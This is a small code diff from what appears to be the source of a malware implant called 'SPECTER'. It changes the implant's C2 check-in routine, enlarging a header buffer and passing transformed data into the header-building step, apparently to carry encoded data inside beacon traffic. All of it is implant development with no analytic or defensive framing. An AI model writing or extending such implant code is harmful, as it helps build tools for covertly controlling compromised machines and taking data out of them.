@@ -1593,11 +1593,12 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
         /* Step 3: profile_build_headers (heap buffer) */
         COMMS_TRACE("[SPECTER] checkin: profile build_headers");
-        DWORD headers_heap_size = 2048;
+        DWORD headers_heap_size = 8192;
         headers_heap = (BYTE *)heap_alloc_cached(headers_heap_size);
         if (!headers_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
 
-        DWORD headers_len = profile_build_headers(prof, (char *)headers_heap, headers_heap_size);
+        DWORD headers_len = profile_build_headers(prof, transformed, transformed_len,
+                                                   (char *)headers_heap, headers_heap_size);
         (void)headers_len;
 
         /* Step 4: profile_get_uri */
